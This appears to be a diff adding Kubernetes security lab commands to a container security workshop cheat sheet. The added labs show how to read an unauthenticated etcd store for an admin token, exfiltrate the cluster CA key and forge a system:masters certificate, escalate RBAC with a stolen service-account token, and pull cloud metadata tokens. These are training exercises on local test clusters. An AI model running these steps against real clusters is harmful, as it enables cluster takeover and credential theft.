@@ -659,6 +659,13 @@ Stop the container (running in background) now that we're done with it.
 docker stop [container name/id]
 ```
 
+## Module 4 - Container IR - GL,HF.
+
+### Slide 69 - NOICE
+```
+docker image pull digitalshokunin/webserver
+```
+
 ### Slide 76 - Clean ups
 
 ```
@@ -673,12 +680,464 @@ docker system prune
 docker container prune
 ```
 
-## Module 4 - Container IR - GL,HF.
-
-### Slide 69 - NOICE
-```
-docker image pull digitalshokunin/webserver
-```
-
 ## Module 5 - Kubernetes 101
 
+> No commands for this section
+
+## Module 6 - The Basics of using K8S
+
+### Slide 100 - Creating a namespace
+
+```
+kubectl create namespace lab-namespace
+```
+
+```
+kubectl get namespace
+```
+
+### Slide 103 - Accessing a cluster
+
+```
+kubectl cluster-info
+```
+
+### Slide 105 - Display pods
+
+```
+kubectl get pods
+```
+
+Specify namespace
+```
+kubectl get pods -n kube-system
+```
+
+All namespaces
+```
+kubectl get pods --all-namespaces
+```
+
+Describe (get more details) on a pod
+```
+kubectl -n kube-system describe pod <name>
+```
+
+### Slide 107 - Run first pod
+
+```
+wget https://k8s.io/examples/pods/simple-pod.yaml
+```
+
+```
+kubectl apply -f simple-pod.yaml --namespace lab-namespace
+```
+
+```
+kubectl get pods
+```
+
+```
+kubectl get pods --namespace lab-namespace
+```
+
+```
+kubectl describe pod nginx --namespace lab-namespace
+```
+
+```
+kubectl get pod nginx --namespace lab-namespace
+```
+
+```
+kubectl get pod nginx -o wide --namespace lab-namespace
+```
+
+## Module 7 - Kubernetes Security
+
+### Slide 123 - CA keys - golden tickets (lab setup)
+
+```
+cd ~ && git clone https://github.com/digital-shokunin/kube_security_lab.git
+```
+
+```
+cd kube_security_lab/
+```
+
+```
+cat etcd-noauth.yml
+```
+
+```
+ansible-playbook etcd-noauth.yml
+```
+This part may take a couple minutes
+
+### Slide 126 - CA keys - golden tickets (lab)
+
+We need the IP for the cluster, going to get it from Docker container for the control plane and assign it to a shell env variable
+```
+export CLUSTERIP1=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' etcdnoauth-control-plane)
+```
+This is needed for etcdctl to work
+```
+export ETCDCTL_API=3
+```
+
+```
+etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 get / --prefix --keys-only
+```
+
+Let's go after the admin token
+```
+etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 \
+get / --prefix --keys-only |grep admins-account-token
+```
+Make note of the random string at the end of the token name, you'll need it later
+
+### Slide 127 - CA keys - golden tickets (lab continued)
+
+Replace `[RAND]` at the end of the command below with the random string at the end of the token from the last command
+```
+etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 get /registry/secrets/default/admins-account-token-[RAND]
+```
+
+Copy the content of the token starting with the eyJ and up to just before the #kubernetes.io, this is the JWT token you'll need to get elevated access to the Kubernetes cluster
+
+Open up vi editing the new file we're creating `token.txt`
+```
+vi token.txt
+```
+
+Paste the contents of the token you copied above by hitting `i`, then pasting.
+
+When done, `[ESC]` to exit insert mode, then type `:` to bring up vim prompt, and type `wq` and press `[ENTER]` to issue the write to file and quit commands to vi
+
+Now we'll save that token as a env variable for later command usage.
+```
+export TOKEN1=$(cat token.txt)
+```
+
+Let's test the token out by listing pods in the kube-system namespace
+```
+kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system get pods
+```
+
+To get at the crown jewels, we'll need to  after the api server, so we'll need the pod name for later.
+
+Replace `[API_SERVER_POD]` with the name of the api server pod (e.g. kube-apiserver-etcdnoauth-control-plane)
+```
+export APIPOD1=[API_SERVER_POD]
+```
+
+Now let's execute a command inside the pod with our admin token to dump the contents of the PKI Certificate Authority private key for the cluster
+```
+kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system exec \
+$APIPOD1 -- cat /etc/kubernetes/pki/ca.key
+```
+
+While the CA cert for the cluster PKI is public might as well grab that too for convenience.
+```
+kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system exec \
+$APIPOD1 -- cat /etc/kubernetes/pki/ca.crt
+```
+
+### Slide 131 - CA keys - golden tickets (lab cont.)
+
+Now that we have the private key for the cluster's CA, we can sign any cert we want that the API server will respect
+
+Let's make life easier by just writing the CA's key and cert to local files instead of copying and pasting them.
+```
+kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system exec \
+$APIPOD1 -- cat /etc/kubernetes/pki/ca.key -- > ca.key
+```
+
+>**Note:** the -- denotes the start of the command to execute in the pod, but the -- at the end denotes the end of the command, so after that the > ca.key which pipes the output into a ca.key file is executed locally, otherwise it'd be executed as part of the command on the pod and wouldn't help us.
+
+```
+kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system exec \
+$APIPOD1 -- cat /etc/kubernetes/pki/ca.crt -- > ca.crt 
+```
+
+Output the two files contents, you should see the out put from the key then the cert
+```
+cat ca.key ca.crt
+```
+
+Now we need to generate a private key for our "user" we're going to impersonate
+```
+openssl genrsa -out user.key 2048
+```
+
+Create a CSR (Certificate Signing Request) and in the subject field, we specify the username as a CN (Common Name) and the group as a O (Organization).
+```
+openssl req -new -key user.key -subj "/CN=kube-apiserver-kubelet-client/O=system:masters" -out user.csr
+```
+
+Since we have the private key and a copy of the public cert, we can now sign this CSR as the CA.
+```
+openssl x509 -req -in user.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out user.crt -days 1024 -sha256
+```
+The signed cert is output to user.crt
+
+### Slide 132 - CA keys - golden tickets (extra credit)
+
+Let's test oout this new user cert by authenticating with it, we simply need to add it to our ~/.kube/config file with kubectl
+```
+kubectl config set-credentials kube-apiserver-kubelet-client --client-certificate=user.crt --client-key=user.key --embed-certs
+```
+
+Now that we've added the cert and associated user to our config, let's modify the kind-etcdnoauth context to use it
+```
+kubectl config set-context kind-etcdnoauth --user=kube-apiserver-kubelet-client --cluster=kind-etcdnoauth --namespace=kube-system
+```
+
+Verify kubectl will use the new cluster not the lab cluster in  ~/.kube/config
+```
+kubectl config use-context kind-etcdnoauth
+```
+
+Let's see what this user we've made part of system:masters can do?
+```
+kubectl auth can-i --list
+```
+
+### Slide 133 - CA keys - Cleanup
+
+```
+cd ~  && kind delete cluster --name etcdnoauth
+```
+
+```
+kind get clusters
+```
+
+Verify the lab cluster is the only cluster still there
+
+### Slide 136 - Next Lab (setup)
+
+```
+cd ~/kube_security_lab/
+```
+
+```
+ansible-playbook client-machine.yml && ansible-playbook ssh-to-get-secrets.yml
+```
+This takes a while to run, you'll need the cluster IP from the end of the output for later.
+
+### Slide 140 - RBAC - Privilege Escalation (lab)
+
+Start a shell in the container that will represent the attacker host
+```
+docker exec -it client /bin/bash
+```
+
+From here ssh to a pod that will represent a pod we've compromised and established a shell on.
+```
+ssh -p 32001 sshuser@[Kubernetes Cluster IP] 
+```
+
+The pod has kubectl (because you (the attacker) put it there or because its included in the pod container for some reason
+
+Let's run some commands and see what the pod's service account roles can do.
+
+```
+kubectl cluster-info
+```
+
+```
+kubectl get clusterrolebinding
+```
+
+```
+kubectl get roles --all-namespaces
+```
+
+```
+kubectl get pods --all-namespaces
+```
+
+Any luck so far? 
+
+### Slide 141 - RBAC - Privilege Escalation (lab)
+
+Let's try one more
+```
+kubectl get secrets --all-namespaces
+```
+Bingo, seems it can list secrets...
+```
+kubectl get secrets -n kube-system |grep clusterrole
+```
+
+Let's get the token for an interesting account
+```
+kubectl -n kube-system get secret clusterrole-aggregation-controller-token-[RAND] -o json
+```
+> Replace `[RAND]` above with the random token string from the same account displayed in the command you rand before.
+
+Paste the token field from the json output into this command where it says `[TOKEN]`.
+```
+export TOKEN=`echo [TOKEN] | base64 -d`
+```
+Now the token is stored decoded inside an environment variable.
+
+If you want to see what it looks like decoded simply type:
+```
+echo $TOKEN
+```
+
+You should recognize the eyJ at the beginning.
+
+### Slide 142 - RBAC - Privilege Escalation (lab)
+
+Use the token we took from the secrets to execute commands on the cluster, and see what it can do.
+```
+kubectl  --token="$TOKEN" get clusterroles
+```
+It can't do much either...
+
+Seems one of the things we can do is edit clusterroles, let's edit the roles for the account of the token we stole.
+```
+kubectl edit clusterrole system:controller:clusterrole-aggregation-controller --token="$TOKEN"
+```
+
+This command loaded a policy in vi, go to the bottom of the policy and look for the rules section, you'll want to add/replace the APIGroups, resources, and verbs with the following.
+```
+- apiGroups:
+  - '*'
+  resources:
+  - '*'
+  verbs:
+  - '*'
+```
+
+Some vi shortcuts that might be useful are [here](https://github.com/lockfale/DC30_Malicious_Containers_Workshop/blob/main/cheatsheet.md#using-vi---useful-shortcuts-for-the-lab)
+
+>Type `[ESC]`, then `:wq` to exit vim and save the policy, if you really mess up, use the `u` key to undo or `[ESC]`, then `q!` to exit without saving and try again.
+
+### Slide 143 - RBAC - Privilege Escalation (lab)
+
+Let's kick the tires on the new policy we set
+```
+kubectl --token="$TOKEN" -n kube-system get pods
+```
+
+Look there's the api-server pod.
+
+```
+kubectl --token="$TOKEN" -n kube-system exec [API SERVER POD] -- cat /etc/kubernetes/pki/ca.key
+```
+
+Once again, we've owned the cluster.
+
+We've taken two service accounts with heavily restricted roles, but had just enough permissions to escalate from there.
+
+### Slide 145 - RBAC - Privilege Escalation (Clean up)
+
+Need to exit out of the pod session and the client container.
+```exit```
+
+```exit```
+
+Now back at your host machine prompt
+
+```kind delete cluster --name sshgs```
+
+```kind get clusters```
+Should only see the lab cluster running.
+
+>**Note:** The attacker machine container stopped when you exited it, you could remove it if you really want to clean that up to, but no real reason to.
+
+### Slide 152 - Demo: Cloud Metadata attacks
+
+Execute a pod in our lab with heavily restricted permissions.
+```
+kubectl apply -f \
+https://raw.githubusercontent.com/digital-shokunin/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml \
+--namespace lab-namespace
+```
+
+```
+kubectl exec -it nothing-allowed-exec-pod -n lab-namespace -- bash
+```
+
+```
+apt update && apt -y install curl
+```
+
+```
+curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/'
+```
+
+```
+curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/id' -w "\n"
+```
+
+```
+curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+```
+
+```
+curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+```
+
+## Appendix
+
+### Slide 178 - Complex Microservices app demo
+
+You can run this in your lab cluster.
+
+```
+kubectl create -f https://raw.githubusercontent.com/microservices-demo/microservices-demo/master/deploy/kubernetes/complete-demo.yaml
+```
+
+```
+kubectl get deployments -n sock-shop
+```
+
+```
+kubectl get replicasets -n sock-shop
+```
+
+### Slide 177 - Accessing services running in containers
+
+Start up web service, but don't expose externally (e.g. `-p 80:80`), only expose locally on bridge interface
+```
+docker run --name=netwebserver -d nginx
+```
+
+Get the IP of the bridge interface
+```
+docker inspect -f "{{ .NetworkSettings.IPAddress }}" netwebserver 
+```
+
+Access service from host machine thru bridge interface
+```
+curl http://[IP]
+```
+
+Clean up 
+```
+docker stop netwebserver
+```
+
+### Slide 186 - Create side-car pod, test nginx, and remove pod (run in conjunction with babby's first pod
+
+```
+kubectl run -it shell-container --image=alpine/curl:3.14 /bin/ash --namespace lab-namespace
+```
+
+Get IP from pod description
+```
+curl http:\\[IP]
+```
+
+```
+exit
+```
+
+```
+kubectl delete pod shell-container --namespace lab-namespace
+```
